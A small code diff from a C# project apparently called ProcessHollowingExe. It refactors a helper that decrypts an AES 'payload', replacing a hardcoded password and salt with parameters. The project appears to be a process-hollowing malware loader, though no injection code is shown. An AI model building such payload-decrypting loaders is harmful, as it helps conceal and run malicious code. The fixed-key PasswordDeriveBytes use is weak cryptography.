@@ -14,8 +14,7 @@ namespace ProcessHollowingExe
             try
             {
                 var pdb =
-                    new PasswordDeriveBytes("ic34xe!!!",//change this!
-                        new byte[] { 0x67, 0x65, 0x74, 0x66, 0x75, 0x63, 0x6b, 0x65, 0x64 });//change this!
+                    new PasswordDeriveBytes(password, iv);
                 var ms = new MemoryStream();
                 Aes aes = new AesManaged();
                 aes.KeySize = 256;
@@ -35,7 +34,7 @@ namespace ProcessHollowingExe
             }
         }
 
-        public static byte[] CaesarDecrypt(byte[] buffer,string password, byte[] iv)
+        public static byte[] CaesarDecrypt(byte[] buffer, string password, byte[] iv)
         {
             Console.WriteLine($"[+] Decrypting AES Payload.");
             var decrypted = AesDecrypt(buffer, password, iv);
